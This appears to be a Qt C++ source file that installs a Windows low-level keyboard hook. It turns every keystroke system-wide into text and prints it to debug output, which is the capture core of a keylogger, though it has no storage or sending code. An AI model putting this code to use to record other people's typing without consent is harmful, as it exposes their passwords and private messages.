#include "core.h"

static HHOOK hHook = nullptr;

Core::Core(QObject *parent) :
    QObject(parent)
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, process, nullptr, 0);
}

void Core::update(BYTE *keyState, int keyCode)
{
    keyState[keyCode] = BYTE(GetKeyState(keyCode));
}

LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT *) lParam);

        wchar_t buffer[6];
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        update(keyboardState, VK_SHIFT);
        update(keyboardState, VK_CAPITAL);
        update(keyboardState, VK_CONTROL);
        update(keyboardState, VK_MENU);

        HKL keyboardLayout = GetKeyboardLayout(0);
        char lpszName[0x100] = {0};
        DWORD dWordMessage = 1;
        dWordMessage += key.scanCode << 16;
        dWordMessage += key.flags << 24;

        int i = GetKeyNameText(dWordMessage, (LPTSTR) lpszName, 255);
        int result = ToUnicodeEx(key.vkCode, key.scanCode, keyboardState, buffer, 5, 0, keyboardLayout);
        buffer[5] = L'\0';

        QString toBeAppended;

        if (i == 5) {
            QString keyString = QString::fromUtf16((ushort *) lpszName);

            if (keyString == "ENTER") {
                toBeAppended = "\n[" + keyString + "]\n";
            } else {
                toBeAppended = QString::fromUtf16((ushort *) buffer);
            }

        } else {
            toBeAppended = QString::fromUtf16((ushort *) buffer);
        }

        qDebug() << toBeAppended;
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}